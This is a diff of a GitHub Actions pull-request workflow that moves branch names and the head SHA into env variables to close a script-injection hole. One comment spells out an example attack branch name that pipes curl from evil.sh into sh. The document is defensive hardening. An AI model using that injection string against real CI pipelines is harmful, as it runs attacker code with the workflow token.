@@ -34,38 +34,47 @@ jobs:
           fetch-depth: 0
 
       - name: Target branch must be main
+        env:
+          BASE_REF: ${{ github.base_ref }}
         run: |
-          if [ "${{ github.base_ref }}" != "main" ]; then
-            echo "::error::PRs must target 'main'. This one targets '${{ github.base_ref }}'."
+          if [ "$BASE_REF" != "main" ]; then
+            echo "::error::PRs must target 'main'. This one targets '$BASE_REF'."
             exit 1
           fi
           echo "Target branch is main."
 
       - name: Source branch must start with dev/
+        env:
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          HEAD="${{ github.head_ref }}"
-          case "$HEAD" in
+          # HEAD_REF comes from the branch name, which a contributor controls.
+          # It is passed via env rather than interpolated into this script: a
+          # branch called  dev/x"; curl evil.sh | sh; #  would otherwise run
+          # arbitrary code with the workflow token.
+          case "$HEAD_REF" in
             dev/*)
-              echo "Branch name OK: $HEAD"
+              echo "Branch name OK: $HEAD_REF"
               ;;
             *)
-              echo "::error::Branch '$HEAD' does not match the required convention 'dev/<name>'."
+              echo "::error::Branch '$HEAD_REF' does not match the required convention 'dev/<name>'."
               echo "::error::Rename it:  git branch -m dev/<name>  then push the new name."
               exit 1
               ;;
           esac
 
       - name: No merge commits on the branch
-        run: |
-          BASE="origin/${{ github.base_ref }}"
-          # Use the PR's real head commit, NOT HEAD.
+        env:
+          BASE_REF: ${{ github.base_ref }}
+          # The PR's real head commit, NOT HEAD.
           #
           # On pull_request events GitHub checks out a synthetic merge commit
           # (refs/pull/<n>/merge) that merges the head branch into the base.
           # That commit has two parents, so `rev-list --merges <base>..HEAD`
           # counts GitHub's own merge and always reports >= 1 - a false failure
           # on every PR. Measuring base..head_sha looks only at the branch.
-          HEAD_SHA="${{ github.event.pull_request.head.sha }}"
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          BASE="origin/$BASE_REF"
           MERGES=$(git rev-list --merges "$BASE..$HEAD_SHA" | wc -l)
           if [ "$MERGES" -gt 0 ]; then
             echo "::error::This branch contains $MERGES merge commit(s). Rebase onto main instead:"
